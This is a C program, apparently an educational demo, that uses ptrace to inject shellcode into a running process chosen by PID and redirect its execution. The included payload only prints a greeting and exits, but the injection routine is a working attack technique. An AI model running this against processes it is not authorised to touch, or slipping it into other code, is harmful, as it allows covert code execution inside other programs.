#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 55

unsigned char *shellcode= 
    "\xe9\x1e\x00\x00\x00"  //          jmp    8048083 <MESSAGE>
    "\xb8\x04\x00\x00\x00"  //          mov    $0x4,%eax
    "\xbb\x01\x00\x00\x00"  //          mov    $0x1,%ebx
    "\x59"                  //          pop    %ecx
    "\xba\x0f\x00\x00\x00"  //          mov    $0xf,%edx
    "\xcd\x80"              //          int    $0x80
    "\xb8\x01\x00\x00\x00"  //          mov    $0x1,%eax
    "\xbb\x00\x00\x00\x00"  //          mov    $0x0,%ebx
    "\xcd\x80"              //          int    $0x80
    "\xe8\xdd\xff\xff\xff"  //          call   8048065 <GOBACK>
    "Hello wolrd!\r\n";     // OR       "\x48\x65\x6c\x6c\x6f\x2c\x20\x57"
                            //          "\x6f\x72\x6c\x64\x21\x0d\x0a"


int inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}


int main (int argc, char *argv[])
{   pid_t target;
    struct user_regs_struct regs;
    int syscall;
    long dst;

    if(argc != 2){
    fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
    exit (1);
    }
    target = atoi(argv[1]);
    printf ("+ Tracing process %d\n", target);
    if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0){
    perror ("ptrace(ATTACH):");
    exit (1);
    }
    printf ("+ Waiting for process...\n");
    wait (NULL);
    printf ("+ Getting Registers\n");
    if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0){
    perror ("ptrace(GETREGS):");
    exit (1);
    }

    printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
    inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
    regs.rip += 2;
    printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
    if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0){
    perror ("ptrace(GETREGS):");
    exit (1);
    }
    printf ("+ Run it!\n");

    if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0){
    perror ("ptrace(DETACH):");
    exit (1);
    }
    return 0;
}
  
  
  	   
